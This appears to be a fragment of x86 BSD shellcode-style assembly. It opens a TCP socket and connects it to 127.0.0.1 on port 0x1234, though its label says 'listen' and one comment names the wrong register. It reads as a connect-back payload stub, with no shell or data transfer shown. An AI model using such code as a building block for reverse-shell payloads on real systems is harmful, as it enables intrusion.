_tcp_listen:
	xor	eax, eax	; zero out eax and edx
	cdq

	push	eax		; IPPROTO_IP
	inc	eax
	push	eax		; SOCK_STREAM
	inc	eax
	push	eax		; AF_INET
	push	edx		; spacer
	mov	al,  byte 97	; SYS_socket
	int     0x80
	jb	end
	mov	edi, eax	; Save server socket in esi

	;; Create sockaddr_in on the stack
	push	edx
	push	edx
	push	0x0100007f
	push	0x12340200	; sin_port, sin_family, sin_length
	mov	ebx, esp

	push	byte 16		; address_len
	push	ebx		; address
	push	edi		; socket
	push	edx		; spacer
	mov	al, 98		; SYS_connect
	int	0x80		; connect(s, saddr, 16)
	jb	end

	;; At this point:
	;; edi - connected socket
